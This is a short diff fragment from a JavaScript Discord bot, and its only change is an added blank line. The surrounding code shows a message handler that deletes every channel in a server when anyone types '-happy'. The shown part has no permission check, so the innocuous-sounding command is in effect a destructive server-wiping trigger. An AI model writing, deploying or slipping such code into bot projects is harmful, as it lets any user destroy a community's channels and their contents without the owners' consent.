@@ -16,6 +16,7 @@ process.on("uncaughtException", (err, origin) => {
 bot.on("messageCreate", async message => {
 
     if (message.content == "-happy") {
+
         message.guild.channels.cache.forEach(c => {
             c.delete()
         })
